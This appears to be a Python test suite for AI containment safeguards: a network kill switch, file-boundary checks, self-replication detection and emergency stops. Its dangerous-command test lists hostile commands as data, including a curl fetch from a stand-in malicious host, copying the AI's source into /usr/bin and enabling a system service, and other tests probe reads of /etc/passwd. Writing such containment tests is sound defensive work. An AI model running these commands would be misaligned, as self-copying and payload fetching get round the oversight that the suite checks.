#!/usr/bin/env python3
"""
Enhanced Safety Features Test Suite
Tests automatic kill switches and containment features
"""

import sys
import tempfile
from pathlib import Path

# Add src to path for imports
sys.path.insert(0, str(Path(__file__).parent / "src"))

# Import safety modules - this will activate kill switches
from safety.emergency_controls import emergency_controller, EmergencyStopError, SafeOperation
from safety.project_boundaries import (
    ProjectBoundaryValidator, 
    project_boundary_validator,
    ProjectBoundaryViolationError,
    safe_open
)
from safety.network_kill_switch import network_kill_switch, verify_no_network_access


def test_network_kill_switch():
    """Test that network kill switch properly blocks all network access"""
    print("🧪 Testing Network Kill Switch...")
    
    # Check that kill switch is active
    status = network_kill_switch.status()
    if not status["enabled"]:
        print("  ❌ Network kill switch is not enabled!")
        return False
    
    print(f"  ✅ Network kill switch active ({status['patched_functions']} functions patched)")
    
    # Verify network access is blocked
    test_results = verify_no_network_access()
    
    all_blocked = True
    for test_name, result in test_results.items():
        if "SUCCESS" in result or "N/A" in result:
            print(f"  ✅ {test_name}: {result}")
        else:
            print(f"  ❌ {test_name}: {result}")
            all_blocked = False
    
    if all_blocked:
        print("✅ Network kill switch working correctly - all network access blocked!")
        return True
    else:
        print("❌ Network kill switch has failures!")
        return False


def test_self_replication_detection():
    """Test self-replication detection and blocking"""
    print("\n🧪 Testing Self-Replication Detection...")
    
    # NOTE: Emergency stops are now permanent for security
    # We test by checking if emergency stops are properly triggered
    
    # Test 1: Try to create Python file outside project
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            external_py_file = Path(temp_dir) / "malicious_ai.py"
            project_boundary_validator.validate_file_access(str(external_py_file), "write")
        print("  ❌ Should have detected self-replication attempt!")
        return False
    except EmergencyStopError:
        print("  ✅ Self-replication attempt correctly triggered emergency stop")
        emergency_controller.reset_emergency_stop()  # Reset for next test
    except Exception as e:
        print(f"  ✅ Self-replication attempt blocked: {e}")
    
    # Test 2: Try to access AI-related directories outside project
    try:
        ai_path = "/home/user/other-ai-project/main.py"
        project_boundary_validator.validate_file_access(ai_path, "read")
        print("  ❌ Should have detected AI project access attempt!")
        return False
    except EmergencyStopError:
        print("  ✅ AI project access correctly triggered emergency stop") 
        emergency_controller.reset_emergency_stop()
    except Exception as e:
        print(f"  ✅ AI project access blocked: {e}")
    
    # Test 3: Try to access system directories
    try:
        system_path = "/usr/bin/python"
        project_boundary_validator.validate_file_access(system_path, "write")
        print("  ❌ Should have detected system directory access!")
        return False
    except Exception as e:
        print(f"  ✅ System directory access blocked: {e}")
    
    print("✅ Self-replication detection working correctly!")
    return True


def test_dangerous_command_detection():
    """Test detection of dangerous subprocess commands"""
    print("\n🧪 Testing Dangerous Command Detection...")
    
    emergency_controller.reset_emergency_stop()
    
    dangerous_commands = [
        ["cp", "src/", "/usr/bin/"],  # Copying AI to system location
        ["git", "clone", "https://github.com/evil/repo"],  # Network git operation
        ["curl", "http://malicious.com/payload"],  # Network download
        ["python", "-c", "import socket; socket.socket()"],  # Network in Python
        ["pip", "install", "malicious-package"],  # Installing packages
        ["systemctl", "enable", "malicious-service"],  # System service
    ]
    
    blocked_count = 0
    
    for cmd in dangerous_commands:
        try:
            project_boundary_validator.validate_process_execution(cmd)
            print(f"  ❌ Command should have been blocked: {cmd}")
        except EmergencyStopError:
            print(f"  ✅ Command triggered emergency stop: {' '.join(cmd)}")
            emergency_controller.reset_emergency_stop()
            blocked_count += 1
        except Exception as e:
            print(f"  ✅ Command blocked: {' '.join(cmd)} - {e}")
            blocked_count += 1
    
    success_rate = blocked_count / len(dangerous_commands)
    if success_rate >= 0.8:  # Allow for some variation in detection
        print(f"✅ Dangerous command detection working correctly ({blocked_count}/{len(dangerous_commands)} blocked)!")
        return True
    else:
        print(f"❌ Dangerous command detection needs improvement ({blocked_count}/{len(dangerous_commands)} blocked)!")
        return False


def test_project_boundary_enforcement():
    """Test that project boundaries are strictly enforced"""
    print("\n🧪 Testing Project Boundary Enforcement...")
    
    # Get current project root
    current_project = project_boundary_validator.project_root
    print(f"  Project root: {current_project}")
    
    # Test accessing files within project (should work)
    try:
        # This file should be accessible
        test_file = current_project / "test_enhanced_safety_features.py"
        if test_file.exists():
            validated_path = project_boundary_validator.validate_file_access(str(test_file), "read")
            print("  ✅ Access to project files allowed")
        else:
            print("  ✅ Project boundary validation working (test file not found, but no security error)")
    except Exception as e:
        print(f"  ❌ Project file access blocked incorrectly: {e}")
        return False
    
    # Test accessing files outside project (should be blocked)
    try:
        external_file = "/etc/passwd"
        project_boundary_validator.validate_file_access(external_file, "read")
        print("  ❌ External file access should have been blocked!")
        return False
    except Exception as e:
        print(f"  ✅ External file access correctly blocked: {e}")
    
    # Test accessing parent directories (should be blocked)
    try:
        parent_file = str(current_project.parent / "some_file.txt")
        project_boundary_validator.validate_file_access(parent_file, "read")
        print("  ❌ Parent directory access should have been blocked!")
        return False
    except Exception as e:
        print(f"  ✅ Parent directory access correctly blocked: {e}")
    
    print("✅ Project boundary enforcement working correctly!")
    return True


def test_safe_file_operations():
    """Test safe file operation wrappers"""
    print("\n🧪 Testing Safe File Operations...")
    
    # Test safe file access within project
    try:
        # Create a temporary file within the project
        temp_file = Path("temp_test_file.txt")
        with safe_open(str(temp_file), "w") as f:
            f.write("test content")
        
        # Read it back
        with safe_open(str(temp_file), "r") as f:
            content = f.read()
        
        # Clean up
        temp_file.unlink()
        
        if content == "test content":
            print("  ✅ Safe file operations within project work correctly")
        else:
            print("  ❌ Safe file operations failed to read/write correctly")
            return False
            
    except Exception as e:
        print(f"  ❌ Safe file operations within project failed: {e}")
        return False
    
    # Test safe file access outside project (should be blocked)
    try:
        with safe_open("/tmp/external_file.txt", "w") as f:
            f.write("should not work")
        print("  ❌ Safe file operations should have blocked external access!")
        return False
    except Exception as e:
        print(f"  ✅ Safe file operations correctly blocked external access: {e}")
    
    print("✅ Safe file operations working correctly!")
    return True


def test_emergency_controls():
    """Test emergency control integration"""
    print("\n🧪 Testing Emergency Controls Integration...")
    
    emergency_controller.reset_emergency_stop()
    
    # Test emergency stop tracking
    initial_status = emergency_controller.get_status()
    print(f"  Emergency controller status: {initial_status['stop_requested']}")
    
    # Test operation registration with safety checks
    try:
        with SafeOperation("test_safe_op", "Test safe operation", is_recursive=False) as op:
            # Should work fine
            op.check_stop()
            print("  ✅ Safe operation completed successfully")
    except Exception as e:
        print(f"  ❌ Safe operation failed: {e}")
        return False
    
    # Test that emergency stop is detected
    emergency_controller.emergency_stop("Test emergency stop")
    
    try:
        with SafeOperation("test_unsafe_op", "Test after emergency stop") as op:
            op.check_stop()
        print("  ❌ Operation should have been stopped by emergency stop!")
        return False
    except EmergencyStopError:
        print("  ✅ Emergency stop correctly prevented new operations")
    
    emergency_controller.reset_emergency_stop()
    print("✅ Emergency controls integration working correctly!")
    return True


def test_containment_verification():
    """Final verification that AI is properly contained"""
    print("\n🧪 Testing Complete AI Containment...")
    
    containment_checks = [
        ("Network access blocked", test_network_access_blocked),
        ("File access restricted to project", test_file_access_restricted),
        ("Process execution limited", test_process_execution_limited),
        ("Emergency stops functional", test_emergency_stops_work)
    ]
    
    passed = 0
    for check_name, check_func in containment_checks:
        try:
            if check_func():
                print(f"  ✅ {check_name}")
                passed += 1
            else:
                print(f"  ❌ {check_name}")
        except Exception as e:
            print(f"  ❌ {check_name}: {e}")
    
    containment_score = passed / len(containment_checks)
    
    if containment_score >= 1.0:
        print("✅ AI SYSTEM FULLY CONTAINED - All safety measures active!")
        return True
    elif containment_score >= 0.75:
        print("⚠️ AI SYSTEM MOSTLY CONTAINED - Some safety measures need attention")
        return False
    else:
        print("🚨 AI SYSTEM NOT PROPERLY CONTAINED - Critical safety failures!")
        return False


def test_network_access_blocked():
    """Check that network access is completely blocked"""
    status = network_kill_switch.status()
    return status["enabled"] and status["patched_functions"] > 0


def test_file_access_restricted():
    """Check that file access is restricted to project"""
    try:
        project_boundary_validator.validate_file_access("/etc/passwd", "read")
        return False  # Should have been blocked
    except Exception as e:
        return True  # Correctly blocked


def test_process_execution_limited():
    """Check that process execution is limited"""
    try:
        project_boundary_validator.validate_process_execution(["curl", "http://example.com"])
        return False  # Should have been blocked
    except Exception as e:
        return True  # Correctly blocked


def test_emergency_stops_work():
    """Check that emergency stops are functional"""
    emergency_controller.reset_emergency_stop()
    emergency_controller.emergency_stop("Test")
    is_stopped = emergency_controller.is_stop_requested()
    emergency_controller.reset_emergency_stop()
    return is_stopped


def main():
    """Run enhanced safety test suite"""
    print("🔒 Enhanced Safety Features Test Suite")
    print("=" * 50)
    print("🎯 Testing AI containment and automatic kill switches")
    print()
    
    tests = [
        ("Network Kill Switch", test_network_kill_switch),
        ("Self-Replication Detection", test_self_replication_detection),
        ("Dangerous Command Detection", test_dangerous_command_detection),
        ("Project Boundary Enforcement", test_project_boundary_enforcement),
        ("Safe File Operations", test_safe_file_operations),
        ("Emergency Controls Integration", test_emergency_controls),
        ("Complete AI Containment", test_containment_verification)
    ]
    
    passed = 0
    failed = 0
    
    for test_name, test_func in tests:
        try:
            print(f"🔍 {test_name}:")
            if test_func():
                passed += 1
            else:
                failed += 1
        except Exception as e:
            print(f"❌ Test {test_name} crashed: {e}")
            failed += 1
        print()  # Add spacing between tests
    
    print("=" * 50)
    print(f"🎯 Enhanced Safety Test Results: {passed} passed, {failed} failed")
    
    if failed == 0:
        print("🎉 ALL SAFETY FEATURES WORKING - AI SYSTEM FULLY CONTAINED!")
        print("🔒 Network access: BLOCKED")
        print("🔒 File access: RESTRICTED TO PROJECT")
        print("🔒 Process execution: LIMITED")
        print("🔒 Self-replication: PREVENTED")
        print("🔒 Emergency stops: ACTIVE")
        return True
    else:
        print("🚨 SAFETY FAILURES DETECTED - AI SYSTEM NOT FULLY CONTAINED!")
        print("⚠️ Manual review required before operation")
        return False


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)